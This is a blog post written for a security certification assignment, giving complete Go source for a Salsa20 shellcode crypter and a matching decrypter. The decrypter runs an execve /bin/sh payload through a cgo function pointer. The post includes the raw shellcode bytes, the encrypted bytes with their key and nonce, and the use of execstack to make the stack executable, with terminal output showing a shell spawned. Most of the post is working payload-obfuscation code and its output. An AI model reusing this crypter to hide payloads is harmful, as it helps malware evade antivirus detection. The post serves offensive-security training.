---
layout: single
title: Creating a custom shellcode crypter
date: 2018-12-12
classes: wide
header:
  teaser: /assets/images/slae32.png
categories:
  - slae
  - infosec
tags:
  - slae
  - assembly
  - crypter
  - go
---

For this last SLAE assignment, I've created a custom shellcode crypter using the [Salsa20](https://en.wikipedia.org/wiki/Salsa20) stream cipher. Salsa20 is a family of 256-bit stream ciphers designed in 2005 and submitted to eSTREAM, the ECRYPT Stream Cipher Project.

I wanted to learn the basics of Golang for some time so this was a good opportunity to try a new programming language. The crypter and decrypter are both written in Go and use the offical golang.org sub-repository crypto packages. I also used the [Cgo](https://golang.org/cmd/cgo/) and [unsafe](https://golang.org/pkg/unsafe/) packages so that I could get around the type safety of the Go programming language and call the shellcode once it has been decrypted.

For demonstration purposes, we will use the standard execve shellcode that executes `/bin/sh`:

```
slemire@slae:~/slae32/examples/Shellcode/Execve$ ../../../compile.sh execve
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
[+] Length: 49
[+] Done!
```

## Crypter

The crypter uses the following input:
- Shellcode
- 24 bytes nonce (generated randomly)
- 32 bytes key (generated randomly)

If the resulting encrypted shellcode contains any null-byte, a warning is displayed.

The crypter code is shown below:
```golang
package main

import "fmt"
import "os"
import "crypto/rand"
import "golang.org/x/crypto/salsa20"

func main() {
    fmt.Printf("Shellcode code crypter\n")

    // execve shellcode /bin/sh
    in := []byte {
            0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
            0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
            0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
            0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
            0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
            0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
            0x43 }

    out := make([]byte, len(in))

    // Generate a random 24 bytes nonce
    nonce := make([]byte, 24)
    if _, err := rand.Read(nonce); err != nil {
            panic(err)
    }

    // Generate a random 32 bytes key
    key_slice := make([]byte, 32)
    if _, err := rand.Read(key_slice); err != nil {
        panic(err)
    }
    var key [32]byte
    copy(key[:], key_slice[:])

    fmt.Printf("Key len: %d bytes\n", len(key))

    fmt.Printf("Key: ")
    for _, element := range key {
        fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")

    fmt.Printf("Nonce: ")
    for _, element := range nonce {
        fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")

    fmt.Printf("Original shellcode: ")

    for _, element := range in {
            fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")
    salsa20.XORKeyStream(out, in, nonce, &key)

    fmt.Printf("Encrypted shellcode: ")
    for _, element := range out {
        fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")

    for _, element := range out {
        if element == 0 {
            fmt.Printf("##########################\n")
            fmt.Printf("WARNING null byte detected\n")
            fmt.Printf("##########################\n")
            os.Exit(1)
        }
    }
}
```

## Decrypter

To decrypt the shellcode, the same `salsa20.XORKeyStream` function is called using the original nonce and key.

The decrypter code is shown below:
```golang
package main

/*
void call_shellcode(char *code) {
        int (*ret)() = (int(*)())code;
        ret();
}
*/
import "C"
import "fmt"
import "unsafe"
import "golang.org/x/crypto/salsa20"

func main() {
    fmt.Printf("Shellcode code decrypter\n")

    // Paste encrypted shellcode here
    in := []byte { 0x79,0x46,0x15,0x27,0xa6,0xdb,0xbc,0x5,0x84,0x97,0x83,0x7c,0x4f,0xed,0x81,0xd,0xf,0x93,0x8e,0x7c,0xd3,0xa5,0x74,0x99,0xaa,0xcd,0xbe,0xd0,0x49,0x54,0xce,0x9d,0xe7,0x4a,0x64,0x95,0xc3,0x83,0xb8,0x58,0x4a,0xe4,0x87,0x49,0xb3,0x6e,0x6a,0x32,0x76 }

    out := make([]byte, len(in))

    // Paste nonce here
    nonce := []byte { 0xc6,0x2f,0xb2,0xd1,0x94,0x7b,0x47,0xa6,0x51,0x5d,0x57,0xfb,0x8a,0x2c,0x3e,0x7f,0x43,0x5a,0xfc,0xbb,0x24,0x4d,0xc7,0xbc }

    // Paste key here
    key := [32]byte { 0x24,0x90,0xef,0x80,0x66,0xee,0xda,0x52,0xfa,0xb9,0x8,0x37,0x3f,0x8e,0x1c,0x3b,0x0,0xec,0x7,0x19,0x5a,0x1f,0x94,0xe7,0x2e,0xdf,0xee,0x8d,0x9,0x63,0xe4,0xb5 }

    salsa20.XORKeyStream(out, in, nonce, &key)

    fmt.Printf("Decrypted shellcode: ")
    for _, element := range out {
        fmt.Printf("%#x,", element)
    }
    fmt.Printf("\n")
    fmt.Printf("Shellcode length: %d\n", len(out))
    fmt.Printf("Executing shellcode...\n")
    C.call_shellcode((*C.char)(unsafe.Pointer(&out[0])))
}
```

## Using the crypter

To compile the crypter and test it, we execute the command `go build -o crypter crypter.go && ./crypter`

```
slemire@slae:~/slae32/assignment7$ go build -o crypter crypter.go && ./crypter
Shellcode code crypter
Key len: 32 bytes
Key: 0x24,0x90,0xef,0x80,0x66,0xee,0xda,0x52,0xfa,0xb9,0x8,0x37,0x3f,0x8e,0x1c,0x3b,0x0,0xec,0x7,0x19,0x5a,0x1f,0x94,0xe7,0x2e,0xdf,0xee,0x8d,0x9,0x63,0xe4,0xb5,
Nonce: 0xc6,0x2f,0xb2,0xd1,0x94,0x7b,0x47,0xa6,0x51,0x5d,0x57,0xfb,0x8a,0x2c,0x3e,0x7f,0x43,0x5a,0xfc,0xbb,0x24,0x4d,0xc7,0xbc,
Original shellcode: 0xeb,0x1a,0x5e,0x31,0xdb,0x88,0x5e,0x7,0x89,0x76,0x8,0x89,0x5e,0xc,0x8d,0x1e,0x8d,0x4e,0x8,0x8d,0x56,0xc,0x31,0xc0,0xb0,0xb,0xcd,0x80,0xe8,0xe1,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
Encrypted shellcode: 0x79,0x46,0x15,0x27,0xa6,0xdb,0xbc,0x5,0x84,0x97,0x83,0x7c,0x4f,0xed,0x81,0xd,0xf,0x93,0x8e,0x7c,0xd3,0xa5,0x74,0x99,0xaa,0xcd,0xbe,0xd0,0x49,0x54,0xce,0x9d,0xe7,0x4a,0x64,0x95,0xc3,0x83,0xb8,0x58,0x4a,0xe4,0x87,0x49,0xb3,0x6e,0x6a,0x32,0x76,
```

Next, the key, nonce and encrypted shellcode are copy/pasted into the `decrypter.go` source file.

Compiling the decrypter uses: `go build -o decrypter decrypter.go`. There is however another step that needs to be executed after for the shellcode to work. By default (in newer Golang versions at least), the stack memory space is not marked executable so our shellcode won't work since it resides on the stack:

The output below shows the decrypter segfaulting when we execute it:
```
slemire@slae:~/slae32/assignment7$ ./decrypter 
...
fatal error: unexpected signal during runtime execution
[signal SIGSEGV: segmentation violation code=0x2 addr=0x841e100 pc=0x841e100]

runtime stack:
runtime.throw(0x80ea75c, 0x2a)
        /usr/local/go/src/runtime/panic.go:608 +0x6a
runtime.sigpanic()
        /usr/local/go/src/runtime/signal_unix.go:374 +0x239

goroutine 1 [syscall]:
runtime.cgocall(0x80bf970, 0x842a718, 0x0)
        /usr/local/go/src/runtime/cgocall.go:128 +0x6e fp=0x842a704 sp=0x842a6ec pc=0x804afee
main._Cfunc_call_shellcode(0x841e100)
        _cgo_gotypes.go:43 +0x33 fp=0x842a718 sp=0x842a704 pc=0x80bf613
main.main()
        /home/slemire/slae32/assignment7/decrypter.go:37 +0x2a1 fp=0x842a7d0 sp=0x842a718 pc=0x80bf8f1
runtime.main()
        /usr/local/go/src/runtime/proc.go:201 +0x206 fp=0x842a7f0 sp=0x842a7d0 pc=0x806cf76
runtime.goexit()
        /usr/local/go/src/runtime/asm_386.s:1324 +0x1 fp=0x842a7f4 sp=0x842a7f0 pc=0x80908f1
```

To resolve this problem we can make the stack executable again by using the `execstack` tool as follows. The shellcode is successfully decrypted and executed, spawning `/bin/sh`.
```
slemire@slae:~/slae32/assignment7$ execstack -s decrypter
slemire@slae:~/slae32/assignment7$ ./decrypter 
Shellcode code decrypter
Decrypted shellcode: 0xeb,0x1a,0x5e,0x31,0xdb,0x88,0x5e,0x7,0x89,0x76,0x8,0x89,0x5e,0xc,0x8d,0x1e,0x8d,0x4e,0x8,0x8d,0x56,0xc,0x31,0xc0,0xb0,0xb,0xcd,0x80,0xe8,0xe1,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
Shellcode length: 49
Executing shellcode...
$ id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1236

All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)